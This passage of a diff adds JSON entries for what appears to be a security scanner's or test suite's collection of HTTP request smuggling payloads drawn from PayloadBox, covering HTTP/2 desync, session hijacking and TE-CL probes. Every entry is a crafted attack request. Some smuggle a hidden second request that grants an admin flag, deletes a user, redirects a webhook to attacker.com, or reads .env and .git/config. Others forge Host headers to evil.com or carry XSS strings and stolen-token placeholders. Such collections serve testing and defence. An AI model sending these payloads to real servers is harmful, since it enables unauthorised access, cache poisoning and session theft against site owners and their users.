+    "body": "\\r\\nPOST / HTTP/2\\r\\nHost: vulnerable-website.com\\r\\nContent-Length: 60",
+    "sourceType": "PayloadBox",
+    "sourceFile": "HTTP2-Desync-Payloads.txt"
+  },
+  {
+    "name": "Http2 Desync Payloads #8",
+    "description": "HTTP Request Smuggling probe from PayloadBox (HTTP2-Desync-Payloads.txt). Target request line: GET /private HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com"
+    },
+    "body": "\\r\\nPOST / HTTP/2\\r\\nHost: vulnerable-website.com\\r\\n:method: POST\\r\\n:path: /\\r\\n:authority: vulnerable-website.com\\r\\nx-forwarded-for: 127.0.0.1\\r\\ncontent-length: 0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "HTTP2-Desync-Payloads.txt"
+  },
+  {
+    "name": "Http2 Desync Payloads #9",
+    "description": "HTTP Request Smuggling probe from PayloadBox (HTTP2-Desync-Payloads.txt). Target request line: GET /admin HTTP/1.1",
+    "headers": {},
+    "body": "\\r\\nPOST / HTTP/2\\r\\nHost: vulnerable-website.com\\r\\nContent-Length: 0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "HTTP2-Desync-Payloads.txt"
+  },
+  {
+    "name": "Http2 Desync Payloads #10",
+    "description": "HTTP Request Smuggling probe from PayloadBox (HTTP2-Desync-Payloads.txt). Target request line: POST /admin/delete HTTP/1.1",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Content-Length": "15"
+    },
+    "body": "username=victim\\r\\n\\r\\nPOST / HTTP/2\\r\\nHost: vulnerable-website.com\\r\\n:method: POST\\r\\n:path: /search\\r\\n:authority: vulnerable-website.com\\r\\ncontent-length: 70",
+    "sourceType": "PayloadBox",
+    "sourceFile": "HTTP2-Desync-Payloads.txt"
+  },
+  {
+    "name": "Http2 Desync Payloads #11",
+    "description": "HTTP Request Smuggling probe from PayloadBox (HTTP2-Desync-Payloads.txt). Target request line: GET /search?q=<script>alert(1)</script> HTTP/1.1",
+    "headers": {
+      "Host": "attacker.com"
+    },
+    "body": "\\r\\nPOST / HTTP/2\\r\\nHost: vulnerable-website.com\\r\\nContent-Length: 0\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "HTTP2-Desync-Payloads.txt"
+  },
+  {
+    "name": "Http2 Desync Payloads #12",
+    "description": "HTTP Request Smuggling probe from PayloadBox (HTTP2-Desync-Payloads.txt). Target request line: GET /cache-poison HTTP/1.1",
+    "headers": {
+      "Host": "evil.com"
+    },
+    "body": "\\r\\nPOST / HTTP/2\\r\\nHost: vulnerable-website.com\\r\\n:method: POST\\r\\n:path: /\\r\\n:authority: vulnerable-website.com\\r\\n:scheme: https\\r\\nx-forwarded-proto: http\\r\\ncontent-length: 0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "HTTP2-Desync-Payloads.txt"
+  },
+  {
+    "name": "Http2 Desync Payloads #13",
+    "description": "HTTP Request Smuggling probe from PayloadBox (HTTP2-Desync-Payloads.txt). Target request line: GET / HTTP/1.1",
+    "headers": {},
+    "body": "\\r\\nPOST / HTTP/2\\r\\nHost: vulnerable-website.com\\r\\nContent-Length: 85",
+    "sourceType": "PayloadBox",
+    "sourceFile": "HTTP2-Desync-Payloads.txt"
+  },
+  {
+    "name": "Http2 Desync Payloads #14",
+    "description": "HTTP Request Smuggling probe from PayloadBox (HTTP2-Desync-Payloads.txt). Target request line: GET /api/internal HTTP/1.1",
+    "headers": {
+      "Host": "localhost",
+      "X-Internal-Request": "true"
+    },
+    "body": "\\r\\nPOST / HTTP/2\\r\\nHost: vulnerable-website.com\\r\\n:method: POST\\r\\n:path: /graphql\\r\\n:authority: vulnerable-website.com\\r\\ncontent-type: application/json\\r\\ncontent-length: 45\\r\\n\\r\\n{\"query\":\"{ __schema { types { name } } }\"}\\r\\n\\r\\nPOST / HTTP/2\\r\\nHost: vulnerable-website.com\\r\\nContent-Length: 0\\r\\n\\r\\nPATCH /api/users/1 HTTP/1.1\\r\\nContent-Type: application/json\\r\\nContent-Length: 18\\r\\n\\r\\n{\"admin\":true}\\r\\n\\r\\nPOST / HTTP/2\\r\\nHost: vulnerable-website.com\\r\\n:method: GET\\r\\n:path: /\\r\\n:authority: vulnerable-website.com\\r\\ncontent-length: 0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "HTTP2-Desync-Payloads.txt"
+  },
+  {
+    "name": "Http2 Desync Payloads #15",
+    "description": "HTTP Request Smuggling probe from PayloadBox (HTTP2-Desync-Payloads.txt). Target request line: PUT /api/config HTTP/1.1",
+    "headers": {
+      "Content-Type": "application/json",
+      "Content-Length": "30"
+    },
+    "body": "{\"setting\":\"malicious_value\"}\\r\\n\\r\\nPOST / HTTP/2\\r\\nHost: vulnerable-website.com\\r\\n:method: POST\\r\\n:path: /webhook\\r\\n:authority: vulnerable-website.com\\r\\ncontent-type: application/json\\r\\ncontent-length: 50\\r\\n\\r\\n{\"url\":\"http://attacker.com/callback\"}\\r\\n\\r\\nPOST / HTTP/2\\r\\nHost: vulnerable-website.com\\r\\nContent-Length: 0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "HTTP2-Desync-Payloads.txt"
+  },
+  {
+    "name": "Http2 Desync Payloads #16",
+    "description": "HTTP Request Smuggling probe from PayloadBox (HTTP2-Desync-Payloads.txt). Target request line: HEAD /admin HTTP/1.1",
+    "headers": {
+      "X-Method-Override": "POST"
+    },
+    "body": "\\r\\nPOST / HTTP/2\\r\\nHost: vulnerable-website.com\\r\\n:method: OPTIONS\\r\\n:path: /api\\r\\n:authority: vulnerable-website.com\\r\\naccess-control-request-method: POST\\r\\ncontent-length: 0\\r\\n\\r\\n\\r\\nPOST / HTTP/2\\r\\nHost: vulnerable-website.com\\r\\nContent-Length: 65\\r\\n\\r\\nOPTIONS /admin HTTP/1.1\\r\\nAccess-Control-Request-Method: DELETE\\r\\n\\r\\n\\r\\nPOST / HTTP/2\\r\\nHost: vulnerable-website.com\\r\\n:method: POST\\r\\n:path: /\\r\\n:authority: vulnerable-website.com\\r\\ncookie: session=victim_session\\r\\ncontent-length: 0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "HTTP2-Desync-Payloads.txt"
+  },
+  {
+    "name": "Http2 Desync Payloads #17",
+    "description": "HTTP Request Smuggling probe from PayloadBox (HTTP2-Desync-Payloads.txt). Target request line: GET /account HTTP/1.1",
+    "headers": {},
+    "body": "\\r\\nPOST / HTTP/2\\r\\nHost: vulnerable-website.com\\r\\nContent-Length: 0\\r\\n\\r\\nTRACE / HTTP/1.1\\r\\nMax-Forwards: 0\\r\\n\\r\\n\\r\\nPOST / HTTP/2\\r\\nHost: vulnerable-website.com\\r\\n:method: CONNECT\\r\\n:authority: internal-server:443\\r\\ncontent-length: 0\\r\\n\\r\\n\\r\\nPOST / HTTP/2\\r\\nHost: vulnerable-website.com\\r\\nContent-Length: 0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "HTTP2-Desync-Payloads.txt"
+  },
+  {
+    "name": "Http2 Desync Payloads #18",
+    "description": "HTTP Request Smuggling probe from PayloadBox (HTTP2-Desync-Payloads.txt). Target request line: GET /.git/config HTTP/1.1",
+    "headers": {},
+    "body": "\\r\\nPOST / HTTP/2\\r\\nHost: vulnerable-website.com\\r\\n:method: POST\\r\\n:path: /.env\\r\\n:authority: vulnerable-website.com\\r\\ncontent-length: 0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "HTTP2-Desync-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #1",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Cookie": "session=abcd1234",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "5a",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #2",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: GET /my-account HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Cookie": "session=victim_session"
+    },
+    "body": "x=1\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #3",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "88",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #4",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: GET /account HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Cookie": "session=stolen_session_token",
+      "X-Session-Hijack": "true"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #5",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "6a",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #6",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: POST /login HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "30"
+    },
+    "body": "username=admin&password=test\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #7",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "70",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #8",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: GET /user/profile HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Forwarded-For": "127.0.0.1"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #9",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "7e",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #10",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: GET /api/session HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Authorization": "Bearer hijacked_token",
+      "X-Steal": "session"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #11",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: GET /dashboard HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Cookie": "PHPSESSID=attacker_session_id"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #12",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "92",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #13",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: POST /auth/verify HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "application/json",
+      "Content-Length": "40"
+    },
+    "body": "{\"token\":\"stolen_jwt_token_here\"}\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #14",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: GET /user/settings HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Session-Token": "hijacked"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #15",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "6c",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #16",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: GET /profile HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Cookie": "auth=victim_auth_token"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #17",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: POST /api/refresh-token HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "25"
+    },
+    "body": "refresh_token=stolen_token",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #18",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: GET /account/orders HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Cookie": "session_id=hijacked_session",
+      "X-Hijack": "true"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #19",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: GET /api/user/me HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Authorization": "Basic dXNlcjpwYXNzd29yZA=="
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #20",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: GET /checkout HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Cookie": "cart_session=victim_cart_id"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #21",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "92",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #22",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: GET /admin/users HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Admin-Session": "hijacked"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #23",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: POST /api/authenticate HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "application/json",
+      "Content-Length": "50"
+    },
+    "body": "{\"username\":\"victim\",\"session\":\"stolen_session\"}\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #24",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "110",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #25",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: GET /private/documents HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Cookie": "access_token=victim_token"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #26",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: GET /wallet HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Wallet-Session": "stolen_wallet_id"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #27",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: POST /api/session/validate HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "application/json",
+      "Content-Length": "35"
+    },
+    "body": "{\"session_id\":\"hijacked_session\"}",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #28",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: GET /messages HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Cookie": "user_id=victim_user_id"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #29",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: GET /api/v1/account HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-API-Token": "hijacked_api_token"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #30",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: GET /transactions HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Authorization": "Bearer victim_access_token"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #31",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "128",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #32",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: GET /oauth/callback?code=hijacked_code HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-OAuth-Hijack": "true"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Session Hijacking Payloads #33",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Session-Hijacking-Payloads.txt). Target request line: POST /2fa/verify HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Content-Length": "30"
+    },
+    "body": "code=123456&session=hijacked\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #1",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "5c\\r\\nGPOST / HTTP/1.1\\r\\nHost: vulnerable-website.com\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 15\\r\\n\\r\\nx=1\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #2",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "1\\r\\nA\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt, Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #3",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "6e",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #4",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "5a",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #5",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: GET /detect HTTP/1.1",
+    "headers": {
+      "Foo": "bar"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt, TE-TE-Payloads.txt, Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #6",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "38",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt, Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #7",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "52",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #8",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: GET /admin/delete?username=carlos HTTP/1.1",
+    "headers": {
+      "Host": "localhost",
+      "X-Admin": "1"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #9",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "5f",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #10",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: GET /account HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Cookie": "session=hijacked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #11",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "9e",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #12",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Content-Length": "50"
+    },
+    "body": "search=<script>alert(1)</script>\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #13",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: GET /api/users HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-API-Key": "stolen"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #14",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "75",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #15",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: GET / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Original-URL": "/admin",
+      "X-Rewrite-URL": "/admin"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #16",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: GET /cache-me HTTP/1.1",
+    "headers": {
+      "Host": "evil-attacker.com",
+      "X-Malicious": "payload"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #17",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: GET / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Cache-Key": "poisoned",
+      "X-Forwarded-Host": "evil.com"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #18",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "56",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #19",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: GET /redirect?url=javascript:alert(1) HTTP/1.1",
+    "headers": {
+      "Foo": "x"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #20",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "5c",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Te Cl Payloads #21",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-CL-Payloads.txt). Target request line: GET /.git/config HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Git": "exposed"
+    },
+    "body": "0",
